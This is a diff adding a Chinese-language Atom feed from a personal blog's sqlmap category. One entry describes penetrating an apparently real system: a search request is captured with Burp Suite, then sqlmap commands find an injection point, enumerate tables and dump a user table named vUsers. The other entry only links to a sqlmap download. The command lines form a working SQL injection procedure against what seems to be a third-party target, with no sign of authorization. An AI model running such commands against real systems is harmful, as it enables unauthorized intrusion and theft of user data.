@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: sqlmap | K]]></title>
+  <link href="http://mzkmzk.github.io/blog/categories/sqlmap/atom.xml" rel="self"/>
+  <link href="http://mzkmzk.github.io/"/>
+  <updated>2015-05-03T20:17:45+08:00</updated>
+  <id>http://mzkmzk.github.io/</id>
+  <author>
+    <name><![CDATA[K]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[sqlmap渗透某系统过程]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/04/30/rac_permeate.markdwon/"/>
+    <updated>2015-04-30T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/04/30/rac_permeate.markdwon</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>主要通过<code>sqlmap</code>进行渗透</p>
+
+<h3>0x00 找到注入点</h3>
+
+<p>如图<a href="15-02-15-01">link</a></p>
+
+<p>通过<code>burpsuite</code>获取此系统中某处的搜索功能 中的信息 然后保存到txt中</p>
+
+<pre><code>python sqlmap.py -r /Users/~/Desktop/injection6.txt
+</code></pre>
+
+<p>然后获取到注入点</p>
+
+<p><a href="15-02-15-02">link</a></p>
+
+<h3>0x02 查询数据库表</h3>
+
+<pre><code>python sqlmap.py -r /Users/~/Desktop/injection6.txt  -p searchKeyword  --tables --exclude-sysdbs 
+</code></pre>
+
+<p><a href="15-02-15-03">link</a></p>
+
+<h3>0x03 渗透步骤</h3>
+
+<p>这可以获取数据库和数据库表
+    python ~/Learning/Hack/sqlmap/sqlmap_new/sqlmap/sqlmap.py -r  ~/Desktop/hackTJRAC_BM.txt  -p tb_QueryText &ndash;tables &ndash;exclude-sysdbs &ndash;columns ,-C,-T,-D &ndash;dump -T vUsers</p>
+
+<h3>参考链接</h3>
+
+<p>sqlmap使用参考手册<a href="http://drops.wooyun.org/tips/143">http://drops.wooyun.org/tips/143</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Mac 使用sqlmap]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/01/29/mac_sqlmap/"/>
+    <updated>2015-01-29T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/01/29/mac_sqlmap</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x01下载sqlmap</h3>
+
+<p><a href="http://sourceforge.net/projects/sqlmap/">http://sourceforge.net/projects/sqlmap/</a></p>
+
+<h3>0x02</h3>
+
+<p>参考链接<a href="http://www.freebuf.com/articles/web/29942.html">http://www.freebuf.com/articles/web/29942.html</a></p>
+]]></content>
+  </entry>
+  
+</feed>
